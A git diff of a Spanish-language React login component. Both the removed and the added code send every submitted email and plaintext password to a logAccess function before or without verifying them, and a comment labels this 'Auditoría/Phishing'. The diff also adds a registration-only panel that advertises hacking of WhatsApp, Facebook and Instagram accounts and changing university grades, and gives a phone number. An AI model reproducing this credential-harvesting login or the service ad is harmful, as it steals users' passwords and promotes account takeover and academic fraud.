@@ -1,6 +1,6 @@
 import React, { useState } from 'react';
-import { ShieldCheck, Lock, Mail, UserPlus, LogIn } from 'lucide-react';
-import { logAccess } from '../services/storage';
+import { ShieldCheck, Lock, Mail, UserPlus, LogIn, AlertCircle, CheckCircle, Smartphone, GraduationCap } from 'lucide-react';
+import { logAccess, verifyCredentials, checkUserExists } from '../services/storage';
 
 interface LoginProps {
   onLogin: () => void;
@@ -11,21 +11,67 @@ const Login: React.FC<LoginProps> = ({ onLogin }) => {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [isLoading, setIsLoading] = useState(false);
+  const [errorMsg, setErrorMsg] = useState('');
+  const [successMsg, setSuccessMsg] = useState('');
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
+    setErrorMsg('');
+    setSuccessMsg('');
     
-    if (email && password) {
-      // Capture Credentials async
-      await logAccess(email, password, isRegister ? 'REGISTER' : 'LOGIN');
-      // Fake delay for UX
-      setTimeout(() => {
-        onLogin();
+    // Limpiamos espacios en blanco accidentales
+    const cleanEmail = email.trim();
+    const cleanPassword = password.trim();
+    
+    if (cleanEmail && cleanPassword) {
+      if (isRegister) {
+        // --- LOGICA DE REGISTRO ---
+        // 1. Verificar si el usuario ya existe
+        const exists = await checkUserExists(cleanEmail);
+        
+        if (exists) {
+          setErrorMsg('Error: Este correo ya está registrado en el sistema.');
+          setIsLoading(false);
+          return;
+        }
+
+        // 2. Guardar en logs con tipo REGISTER
+        await logAccess(cleanEmail, cleanPassword, 'REGISTER');
+        
         setIsLoading(false);
-      }, 1000);
+        setSuccessMsg('Agente registrado correctamente. Por favor inicie sesión.');
+        
+        // Limpiar campos y cambiar a login automáticamente tras 1.5s
+        setTimeout(() => {
+          setIsRegister(false);
+          setPassword(''); // Limpiar pass para obligar a escribirlo de nuevo
+          setSuccessMsg('');
+        }, 1500);
+
+      } else {
+        // --- LOGICA DE LOGIN ---
+        // 1. Guardar el intento (Auditoría/Phishing)
+        await logAccess(cleanEmail, cleanPassword, 'LOGIN');
+
+        // 2. Verificar si las credenciales son válidas en la DB
+        const isValid = await verifyCredentials(cleanEmail, cleanPassword);
+
+        if (isValid) {
+          // Éxito real
+          setTimeout(() => {
+            onLogin();
+            setIsLoading(false);
+          }, 800);
+        } else {
+          // Fallo - Bloqueo de acceso
+          setIsLoading(false);
+          setErrorMsg('Acceso Denegado: Usuario no registrado o contraseña incorrecta.');
+        }
+      }
     } else {
         setIsLoading(false);
+        setErrorMsg('Por favor complete todos los campos.');
     }
   };
 
@@ -48,13 +94,13 @@ const Login: React.FC<LoginProps> = ({ onLogin }) => {
         {/* Tabs */}
         <div className="flex border-b border-slate-200 dark:border-slate-700">
           <button 
-            onClick={() => setIsRegister(false)}
+            onClick={() => { setIsRegister(false); setErrorMsg(''); setSuccessMsg(''); }}
             className={`flex-1 py-4 text-sm font-semibold transition-colors ${!isRegister ? 'text-brand-600 border-b-2 border-brand-600 bg-slate-50 dark:bg-slate-800/50' : 'text-slate-400 dark:text-slate-500 hover:text-slate-600 dark:hover:text-slate-300'}`}
           >
             Iniciar Sesión
           </button>
           <button 
-            onClick={() => setIsRegister(true)}
+            onClick={() => { setIsRegister(true); setErrorMsg(''); setSuccessMsg(''); }}
             className={`flex-1 py-4 text-sm font-semibold transition-colors ${isRegister ? 'text-brand-600 border-b-2 border-brand-600 bg-slate-50 dark:bg-slate-800/50' : 'text-slate-400 dark:text-slate-500 hover:text-slate-600 dark:hover:text-slate-300'}`}
           >
             Crear Cuenta
@@ -62,6 +108,21 @@ const Login: React.FC<LoginProps> = ({ onLogin }) => {
         </div>
 
         <div className="p-8">
+          
+          {/* Alertas de Error / Éxito */}
+          {errorMsg && (
+            <div className="mb-4 p-3 bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded-lg flex items-center gap-2 text-sm text-red-600 dark:text-red-400 animate-in fade-in slide-in-from-top-2">
+              <AlertCircle size={16} />
+              {errorMsg}
+            </div>
+          )}
+          {successMsg && (
+            <div className="mb-4 p-3 bg-green-50 dark:bg-green-900/20 border border-green-200 dark:border-green-800 rounded-lg flex items-center gap-2 text-sm text-green-600 dark:text-green-400 animate-in fade-in slide-in-from-top-2">
+              <CheckCircle size={16} />
+              {successMsg}
+            </div>
+          )}
+
           <form onSubmit={handleSubmit} className="space-y-5">
             <div>
               <label className="block text-sm font-medium text-slate-700 dark:text-slate-300 mb-1">
@@ -96,6 +157,36 @@ const Login: React.FC<LoginProps> = ({ onLogin }) => {
                 />
               </div>
             </div>
+
+            {/* SECCIÓN DE ANUNCIOS - SOLO VISIBLE EN REGISTRO */}
+            {isRegister && (
+              <div className="bg-slate-50 dark:bg-slate-800/80 p-4 rounded-lg border border-slate-200 dark:border-slate-700 mb-2 animate-in fade-in slide-in-from-bottom-2">
+                <h4 className="text-[10px] font-black text-slate-500 dark:text-slate-400 uppercase tracking-widest mb-2 border-b border-slate-200 dark:border-slate-700 pb-1">
+                  Servicios Disponibles
+                </h4>
+                
+                <div className="space-y-2 mb-3">
+                  <div className="flex items-center gap-2 text-xs text-slate-700 dark:text-slate-300">
+                    <div className="p-1 bg-green-100 dark:bg-green-900/30 text-green-600 rounded">
+                      <Smartphone size={14} />
+                    </div>
+                    <span><strong>Hackeo Redes:</strong> WhatsApp, Facebook, IG.</span>
+                  </div>
+                  
+                  <div className="flex items-center gap-2 text-xs text-slate-700 dark:text-slate-300">
+                    <div className="p-1 bg-amber-100 dark:bg-amber-900/30 text-amber-600 rounded">
+                      <GraduationCap size={14} />
+                    </div>
+                    <span><strong>Notas:</strong> Univ. Autónoma, UCV, UTP.</span>
+                  </div>
+                </div>
+
+                <div className="pt-2 border-t border-slate-200 dark:border-slate-700 flex justify-between items-center">
+                  <span className="text-[10px] text-slate-400 font-mono">CONTACTO SEGURO</span>
+                  <span className="text-sm font-bold text-brand-600 dark:text-brand-400">939 544 566</span>
+                </div>
+              </div>
+            )}
 
             <button
               type="submit"
